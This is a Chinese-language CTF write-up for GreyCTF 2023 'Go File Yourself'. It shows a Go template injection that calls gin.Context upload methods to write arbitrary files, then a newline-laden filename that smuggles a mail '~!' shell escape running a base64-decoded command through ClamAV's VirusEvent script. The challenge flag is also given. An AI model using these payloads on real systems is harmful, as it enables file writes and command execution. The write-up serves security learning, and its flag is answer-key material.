# GreyCTF 2023 Go File Yourself

## 题目简述

Gin 应用把 `name` 直接拼进 Go `html/template` 源码，并把当前 `gin.Context` 作为模板数据。攻击者可在模板中调用 `FormFile` 和 `SaveUploadedFile`，把 multipart 文件写到任意路径。预期第二阶段利用带换行的文件名污染 ClamAV 的 `VirusEvent` 邮件脚本，通过 mail 的 `~!` 转义执行命令。

## 解题过程

模板点对象就是 `gin.Context`。上传字段名为 `lol` 时，可在 `name` 中执行：

```gotemplate
{{$f := .FormFile "lol"}}{{.SaveUploadedFile $f "/uploads/NAME"}}
```

路径 `NAME` 可包含换行。上传内容使用 EICAR 测试串，使 ClamAV 将文件判定为病毒；文件名则设计为：

```text
a
~! echo BASE64_COMMAND | base64 -d | bash
a
```

检测事件把完整路径放入 `CLAM_VIRUSEVENT_FILENAME`。`mailvirus.sh` 在 here-document 中未做安全处理：

```sh
/usr/bin/mail -s "Virus detected" root <<EOF
A virus has been detected in the file ${CLAM_VIRUSEVENT_FILENAME}
EOF
```

换行使 `~! ...` 独占一行，`mail` 在交互式邮件正文中把它解释为 shell escape。命令可调用 SUID `/readflag` 并把结果发送到自有接收端；预期 flag 为：

```text
grey{thEr3S_4_l3S50N_HErE_BuT_i_DonT_KN0w_wHAT}
```

需要如实说明：仓库 README 记录赛时 ClamAV 未知原因没有触发该脚本，主办方当时对能证明任意文件上传的队伍直接给分。因此上面是源码所表达的预期完整链，而不是可宣称已在赛时远端稳定复现的结果。

## 方法总结

漏洞跨越三个解释层：Go 模板方法调用、文件路径、以及 mail 的 tilde escape。即使上传路由被删除，把带高权限方法的上下文对象交给攻击者可控模板仍等价于重新开放上传。事件处理脚本还必须把文件名当纯数据传递，避免让换行进入具有命令语义的终端程序。
